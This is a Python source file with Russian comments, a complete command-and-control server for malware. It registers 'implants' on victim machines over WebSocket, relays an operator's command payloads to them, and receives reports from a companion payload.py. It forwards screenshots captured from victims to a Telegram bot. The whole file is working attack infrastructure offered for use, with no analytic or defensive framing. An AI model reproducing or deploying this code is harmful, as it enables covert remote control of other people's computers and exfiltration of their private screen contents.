# --- ФАЙЛ: c2_server.py (Финальный Штаб) ---
import asyncio, json, os, threading, base64
import requests
from aiohttp import web
import settings

IMPLANTS, OPERATOR = {}, None

def send_telegram_photo(caption, photo_data):
    def send():
        try:
            image_bytes = base64.b64decode(photo_data)
            files = {'photo': ('screenshot.jpg', image_bytes, 'image/jpeg')}
            url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendPhoto"
            data = {'chat_id': settings.CHAT_ID, 'caption': caption}
            requests.post(url, data=data, files=files, timeout=20)
        except Exception as e: print(f"[!] Ошибка отправки фото в Telegram: {e}")
    threading.Thread(target=send, daemon=True).start()

async def broadcast_bot_list():
    if OPERATOR and not OPERATOR.closed:
        await OPERATOR.send_json({'type': 'bot_list', 'data': [{'id': bot_id} for bot_id in IMPLANTS.keys()]})

# <<< НОВОЕ ОКНО ДЛЯ ДОНЕСЕНИЙ >>>
async def report_handler(request):
    """Принимает донесения от гонцов (payload.py) по HTTP POST."""
    try:
        data = await request.json()
        bot_id = data.get('bot_id')
        print(f"[+] Получен отчет от {bot_id} (тип: {data.get('type')})")

        if data.get('type') == 'screenshot_result' and data.get('data'):
            print(f"[*] Отправка скриншота от {bot_id} в Telegram...")
            send_telegram_photo(f"📸 Скриншот от {bot_id}", data['data'])

        if OPERATOR and not OPERATOR.closed:
            # Пересылаем отчет оператору
            await OPERATOR.send_json(data)

        return web.Response(status=200)
    except Exception:
        return web.Response(status=500)

async def websocket_handler(request):
    global OPERATOR, IMPLANTS
    ws = web.WebSocketResponse(heartbeat=25.0)
    await ws.prepare(request)
    client_type, client_id = None, None

    try:
        initial_msg = await ws.receive_json(timeout=30.0)
        client_type = initial_msg.get('type')

        if client_type == 'operator': OPERATOR = ws; await broadcast_bot_list()
        elif client_type == 'implant' and 'id' in initial_msg: client_id = initial_msg.get('id'); IMPLANTS[client_id] = ws; await broadcast_bot_list()
        else: await ws.close(); return ws

        async for msg in ws:
            if msg.type != web.WSMsgType.TEXT or msg.data == 'pong': continue
            try: data = json.loads(msg.data)
            except: continue

            # Логика отправки команд остается прежней
            if client_type == 'operator':
                target_id = data.get('target_id')
                if target_id in IMPLANTS and not IMPLANTS[target_id].closed:
                    await IMPLANTS[target_id].send_json(data.get('payload', {}))
    except Exception: pass
    finally:
        if client_type == 'implant' and client_id in IMPLANTS: del IMPLANTS[client_id]; await broadcast_bot_list()
        elif client_type == 'operator': OPERATOR = None
    return ws

async def http_handler(request):
    return web.FileResponse(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'index.html'))

app = web.Application()
app.router.add_get('/', http_handler)
app.router.add_get('/ws', websocket_handler)
app.router.add_post('/report', report_handler) # <-- Регистрируем новое окно

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    print(f"====== C2 SERVER (Крепость) ONLINE на порту {port} ======")
    web.run_app(app, host='0.0.0.0', port=port)
